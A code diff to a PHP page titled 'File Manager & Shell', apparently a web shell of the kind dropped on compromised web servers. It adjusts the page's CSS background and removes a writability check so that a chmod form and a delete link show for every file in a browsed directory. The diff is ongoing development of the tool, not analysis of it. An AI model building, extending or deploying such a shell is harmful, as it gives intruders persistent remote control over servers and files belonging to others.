@@ -265,12 +265,19 @@ function human_filesize($bytes, $decimals = 2) {
 <meta charset="utf-8" />
 <title>File Manager & Shell</title>
 <style>
-html, body { height: 100%; margin: 0; }
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  min-height: 100%;
+}
+
 body {
   padding: 20px;
   background-image: url('https://i.imgur.com/gnQC6Ou.png');
   background-size: cover;
   background-position: center center;
+  background-attachment: fixed; /* Ini yang membuat background tetap saat discroll */
   background-repeat: no-repeat;
   font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
   color: #ddd;
@@ -514,18 +521,15 @@ foreach ($files as $file) {
     echo '<td><span title="Permission" style="color:' . $color_perm . ';">' . $perm_display . '</span></td>';
     echo '<td>' . htmlspecialchars($created_date) . '</td>';
 
-    echo '<td style="display:flex; gap:8px; align-items:center;">';
-    if (is_writable($full)) {
-        echo '<form class="form-chmod" method="post" action="?path=' . urlencode($path) . '">';
-        echo '<input type="hidden" name="chmod_file" value="' . htmlspecialchars($file) . '">';
-        echo '<input type="text" name="new_perm" value="' . $perm_octal . '" maxlength="4" pattern="[0-7]{3,4}" title="Octal format, e.g. 0644" required>';
-        echo '<input type="submit" value="Set">';
-        echo '</form>';
-    } else {
-        echo '<span class="small-muted">no-write</span>';
-    }
-    echo '<a href="?path=' . urlencode($path) . '&delete=' . urlencode($file) . '" class="del-link" onclick="return confirm(\'Delete ' . addslashes($file) . '?\');">Del</a>';
-    echo '</td>';
+echo '<td style="display:flex; gap:8px; align-items:center;">';
+// Form chmod selalu ditampilkan tanpa pengecekan is_writable
+echo '<form class="form-chmod" method="post" action="?path=' . urlencode($path) . '">';
+echo '<input type="hidden" name="chmod_file" value="' . htmlspecialchars($file) . '">';
+echo '<input type="text" name="new_perm" value="' . $perm_octal . '" maxlength="4" pattern="[0-7]{3,4}" title="Octal format, e.g. 0644" required>';
+echo '<input type="submit" value="Set">';
+echo '</form>';
+echo '<a href="?path=' . urlencode($path) . '&delete=' . urlencode($file) . '" class="del-link" onclick="return confirm(\'Delete ' . addslashes($file) . '?\');">Del</a>';
+echo '</td>';
 
     echo '</tr>';
 }
